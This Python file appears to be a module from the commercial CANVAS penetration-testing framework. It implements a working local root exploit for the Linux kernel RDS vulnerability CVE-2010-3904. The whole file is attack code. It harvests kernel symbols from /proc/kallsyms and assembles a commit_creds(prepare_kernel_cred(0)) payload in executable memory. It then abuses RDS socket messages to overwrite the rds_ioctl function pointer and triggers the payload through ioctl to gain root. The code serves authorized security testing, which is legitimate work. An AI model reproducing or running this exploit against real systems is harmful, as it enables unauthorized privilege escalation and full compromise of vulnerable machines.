# -*- coding: utf-8 -*-
##ImmunityHeader v1
###############################################################################
## File       :  linux_rds.py
## Description:  
##            :  
## Created_On :  Tue Dec 28 14:22:42 ART 2010
## Created_By :  Agustin Gianni
## (c) Copyright 2010, Immunity Inc all rights reserved.
###############################################################################
#! /usr/bin/env python
# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information
#
# Thanks Bas!
#

import sys
if "." not in sys.path: 
    sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localexploit import LocalExploit
from MOSDEF import mosdef

NOTES = """This exploit works from CANVAS only on 32 bit nodes. To escalate privileges
on 64 bit machines, a statically compiled exploit is shipped on the exploit directory."""

NAME                            = "linux_rds"
DESCRIPTION                     = "Linux Kernel <= 2.6.36-rc8 RDS privilege escalation exploit"
DOCUMENTATION                   = {}
DOCUMENTATION["VENDOR"]         = "Linux"
DOCUMENTATION["Date public"]    = "2010-10-19"
DOCUMENTATION["CVE Name"]       = "CVE-2010-3904"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3904"
DOCUMENTATION["References"]     = ["http://www.vsecurity.com/resources/advisory/20101019-1/"]
VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY["TYPE"]                = "Exploit"
PROPERTY["SITE"]                = "Local"
PROPERTY["ARCH"]                = [ ["Linux",  "x32"], ["Linux",  "x64"]]
PROPERTY["KERNELVER"]           = ["2.6.30","2.6.36-rc8"]

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name      = NAME
        self.symdict   = {}
        self.RECVPORT  = 9876
        self.SENDPORT  = self.RECVPORT + 1
        self.MMAP_FAIL = [0xfffffff3, 0xfffffff2, 0xfffffff1, 0xffffffff]

    def get_args(self):
        return
    
    def get_remote_symbols(self):
        """
        This procedure will try to read the "symbol table" from the remote machine.
        The symbols will be stored in a dictionary indexed by name and it will
        be returned by this function.
        To read the symbols we used a brad"s enlightenment like procedure
        """
        symdict = {}
        symbol_file = "/proc/kallsyms"

        fd = self.node.shell.open(symbol_file, self.node.shell.libc.getdefine('O_RDONLY'))
        if sint32(fd) < 0:
            self.log("[+] Could not open /proc/kallsyms trying with /proc/ksyms")

            symbol_file = "/proc/ksyms"
            fd = self.node.shell.open("/proc/ksyms", self.node.shell.libc.getdefine('O_RDONLY'))
            if sint32(fd) < 0:
                self.log("[+] Could not open /proc/ksyms")
                self.toggle_kallsyms = False
                return None
        
        ret, fs = self.node.shell.fstat(fd)
        if ret:
            self.log("[+] Could not stat %s" % symbol_file)
            self.toggle_kallsyms = False
            return None

        # Get the size to read.
        rsize = fs["st_size"]
        self.log("[+] %s size: %d bytes (0 reads until EOF)" % (symbol_file, rsize))
        if not rsize:
            rsize = -1 # read until EOF

        # Read it from node :)
        kallsyms = self.node.shell.readfromfd(fd, rsize)
        self.node.shell.close(fd)

        lines = kallsyms.split("\n")
        for line in lines:
            sym = line.split()
            try:
                symdict[sym[2]] = int(sym[0], 16)
                #self.log("[+] found %s @ %x" % (sym[2], symdict[sym[2]]))
            except:
                pass

        return symdict

    def get_kernel_sym(self, name):
        """
        Wrapper to mantain isomorphism between the .c exploit (?)
        """
        return self.symdict.get(name)
    
    def memcpy_code(self, p, code):
        vars = {"code" : code, "codelen" : len(code), "page" : p}
        
        code = """
        #import "local", "memcpy" as "memcpy"
        #import "local", "sendint" as "sendint"
        
        #import "string", "code" as "code"
        #import "int", "codelen" as "codelen"
        #import "int", "page" as "page"
        
        void
        main()
        {
            char *p;
            int ret;
            
            p = page;
            ret = memcpy(p, code, codelen);
            
            sendint(ret);
        }
        """
        
        ret = self.node.shell.runCode(code, vars)
        if ret != p:
            self.log("[-] memcpy failed")
            raise Exception, "memcpy failed"

        return ret

    def get_kernel_payload_x64(self):
        pass

    def get_kernel_payload_x86(self):
        """
        Code equivalent to this:
        commit_creds(prepare_kernel_cred(0));
        return 0;
        """
        # Resolve needed symbols
        commit_creds = self.get_kernel_sym("commit_creds")
        prepare_kernel_cred = self.get_kernel_sym("prepare_kernel_cred")

        if not commit_creds or not prepare_kernel_cred:
            self.log("[-] Could not get required kernel symbols, aborting.")
            return None

        self.log("[+] Preparing commit_creds payload")

        cred_code = \
        """
        xorl %%eax,%%eax
        movl $0x%x,%%edi
        call *%%edi
        movl $0x%x,%%edi
        call *%%edi
        xorl %%eax,%%eax
        ret
        """ % (prepare_kernel_cred, commit_creds)

        return mosdef.assemble(cred_code, "X86")

    def get_kernel_payload(self):
        # TODO: this must change when 64bits is supported
        return self.get_kernel_payload_x86()

    def get_socket(self, port):
        """
        Returns a RDS socket binded to localhost on port "port"
        """
        from socket import htons

        vars = {}
        vars["PORT"]           = port
        vars["PF_RDS"]         = 21
        vars["AF_INET"]        = self.node.shell.libc.getdefine("AF_INET")
        vars["SOCK_SEQPACKET"] = self.node.shell.libc.getdefine("SOCK_SEQPACKET")

        code = """
        #import "local","socket" as "socket"
        #import "local","sendint" as "sendint"
        #import "local","close" as "close"
        #import "local","memset" as "memset"
        #import "local","bind" as "bind"

        #import "int","SOCK_SEQPACKET" as "SOCK_SEQPACKET"
        #import "int","PF_RDS" as "PF_RDS"
        #import "int","PORT" as "PORT"
        #import "int","AF_INET" as "AF_INET"

        #include <sys/socket.h>

        void
        main(void)
        {
            struct sockaddr_in addr;
            int out_fd;
            int one;

            memset(&addr, 0, 16);
            addr.sin_addr_s_addr = htonl(0x7f000001);
            addr.sin_family      = AF_INET;
            addr.sin_port        = htons(PORT);

            out_fd = socket(PF_RDS, SOCK_SEQPACKET, 0);
            setsockopt(out_fd, SOL_SOCKET, SO_REUSEADDR, &one, 4);
            bind(out_fd, &addr, 16);

            sendint(out_fd);
        }
        """

        out_fd = self.node.shell.runCode(code, vars)
        if sint32(out_fd) < 0:
            self.log("[+] Error setting up socket.")

        return out_fd

    def write_to(self, address, value, read_sock, write_sock):
        vars = {}
        vars["PORT"]       = self.RECVPORT
        vars["address"]    = address
        vars["value"]      = value
        vars["read_sock"]  = read_sock
        vars["write_sock"] = write_sock
        vars["AF_INET"]    = self.node.shell.libc.getdefine("AF_INET")

        code = """
        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        #import "int","PORT" as "PORT"
        #import "int","address" as "address"
        #import "int","value" as "value"
        #import "int","read_sock" as "read_sock"
        #import "int","write_sock" as "write_sock"
        #import "int","AF_INET" as "AF_INET"

        #include <sys/socket.h>

        struct iovec
        {
            char         *iov_base;
            unsigned int  iov_len;
        };

        struct msghdr
        {
            char         *msg_name;
            unsigned int  msg_namelen;
            struct iovec *msg_iov;
            unsigned int  msg_iovlen;
            char         *msg_control;
            unsigned int  msg_controllen;
            int           msg_flags;
        };

        void
        main()
        {
            struct iovec vector;
            struct msghdr msg;
            struct sockaddr_in addr;
            int ret;
            unsigned int buf;

            buf = value;

            memset(&vector, 0, 8);
            memset(&msg, 0, 28);
            memset(&addr, 0, 16);

            // Fill the address of the endpoint.
            addr.sin_port   = htons(PORT);
            addr.sin_family = AF_INET;
            addr.sin_addr_s_addr = htonl(0x7f000001);

            // This is the DWORD to copy.
            vector.iov_base = &buf;
            vector.iov_len  = 4;

            // Build the message to send.
            msg.msg_name    = &addr;
            msg.msg_namelen = 16;
            msg.msg_iov     = &vector;
            msg.msg_iovlen  = 1;

            // Send the value we want to write.
            ret = sendmsg(write_sock, &msg, 0);
            if(ret != -1)
            {
                sleep(1);
                // Write what is in the buffer to address 'address'
                ret = recvfrom(read_sock, address, 4, 0, 0, 0);
            }

            sendint(ret);
        }
        """

        ret = self.node.shell.runCode(code, vars)
        if sint32(ret) < 0:
            self.log("[+] Error trying to write to kernel memory.")
            self.log("[+] Target is patched against us :-(.")

        return ret

    def get_dword_size(self):
        # TODO: This must change in 64 bits
        return 4

    def get_pagesize(self):
        """ returns pagesize """
        return self.node.shell.getpagesize()

    def call_ioctl(self, socket):
        from socket import htons

        vars = {}
        vars["SOCKET"] = socket

        code = """
        #import "local","sendint" as "sendint"
        #import "local","ioctl" as "ioctl"

        #import "int","SOCKET" as "SOCKET"

        #include <sys/socket.h>

        void
        main(void)
        {
            int ret;
            ret = ioctl(SOCKET, 0, 0);
            sendint(ret);
        }
        """

        ret = self.node.shell.runCode(code, vars)
        if sint32(ret) < 0:
            self.log("[+] Error calling ioctl to trigger payload.")

        return ret

    def exploit(self):
        # Request remote symbols.
        self.symdict = self.get_remote_symbols()

        # These calls will trigger the load of rds module.
        read_sock  = self.get_socket(self.RECVPORT)
        write_sock = self.get_socket(self.SENDPORT)

        if read_sock == -1 or write_sock == -1:
            self.log("[-] Failed to open sockets. Maybe we should try a different port?.")
            return -1

        self.log("[+] Got sockets %d and %d" %(read_sock, write_sock))

        sock_ops    = self.get_kernel_sym("rds_proto_ops")
        o_rds_ioctl = self.get_kernel_sym("rds_ioctl")


        if not sock_ops or not o_rds_ioctl:
            self.log("[-] Failed to resolve kernel symbols.")
            return -1

        self.log("[+] Symbol rds_proto_ops @ %x" % sock_ops)
        self.log("[+] Symbol rds_ioctl     @ %x" % o_rds_ioctl)
        self.page_size = self.get_pagesize()
        self.log("[+] Page size is %x" % self.page_size)

        # Get some memory to place our payload.
        payload_address = self.mmap_syscall(0, self.page_size, fixed = False)
        if payload_address in self.MMAP_FAIL:
            self.log("[-] mmap failed")

        payload = self.get_kernel_payload()
        if not payload:
            self.log("[-] Could not get payload. The exploit failed.")
            return -1

        self.memcpy_code(payload_address, payload)
        self.log("[+] Kernel Payload is @ %x" % payload_address)

        rds_ioctl = sock_ops + 9 * self.get_dword_size()

        self.log("[+] Overwriting rds_ioctl function pointer")
        if self.write_to(rds_ioctl, payload_address, read_sock, write_sock) == -1:
            self.log("[-] The exploit failed.")
            return -1

        self.log("[+] Executing payload.")
        if self.call_ioctl(write_sock) == -1:
            self.log("[-] The exploit failed.")
            return -1

        self.log("[+] Restoring original value of rds_ioctl function pointer.")
        if self.write_to(rds_ioctl, o_rds_ioctl, read_sock, write_sock) == -1:
            self.log("[-] The exploit failed.")
            return -1

        # If True, we got root.
        if 0 in self.node.shell.ids():
            return 0

        return -1

    def mmap_syscall(self, mma, size, fixed=True):
        PROT_EXEC       = self.node.shell.libc.getdefine('PROT_EXEC')
        PROT_READ       = self.node.shell.libc.getdefine('PROT_READ')
        PROT_WRITE      = self.node.shell.libc.getdefine('PROT_WRITE')
        MAP_PRIVATE     = self.node.shell.libc.getdefine('MAP_PRIVATE')
        MAP_ANONYMOUS   = self.node.shell.libc.getdefine('MAP_ANONYMOUS')
        MAP_FIXED       = self.node.shell.libc.getdefine('MAP_FIXED')
        MAP_FAILED      = self.node.shell.libc.getdefine('MAP_FAILED')

        if fixed == True:
            flags = MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED
        else:
            flags = MAP_PRIVATE | MAP_ANONYMOUS

        p = uint32(self.node.shell.mmap(uint32(mma),\
                                 size,\
                                 PROT_READ | PROT_WRITE | PROT_EXEC,\
                                 flags,\
                                 -1,\
                                 0))

        self.log('[+] mmap result: 0x%x (flags: %x)' % (p, flags))
        return p

    def run(self):
        """ This run happens on all nodes selected """
        self.setInfo("%s (in progress)" % (NAME))
        self.get_args()
        for node in self.argsDict["passednodes"]:
            type        = node.nodetype
            nodename    = node.getname()
            caps        = node.capabilities

            if "linux" not in caps:
                self.log("[-] Node %s not a Linux node skipping it" % nodename)
                continue
            else:
                self.node = node
                if self.exploit() == 0:
                    self.log("[+] Got root ... we like root ...")
                    self.setInfo("%s (Succeeded)" % (NAME))
                    return True

        self.setInfo("%s (Failed)" % (NAME))
        return False

if __name__=="__main__":
    print "This module is meant to be run only within CANVAS"
    
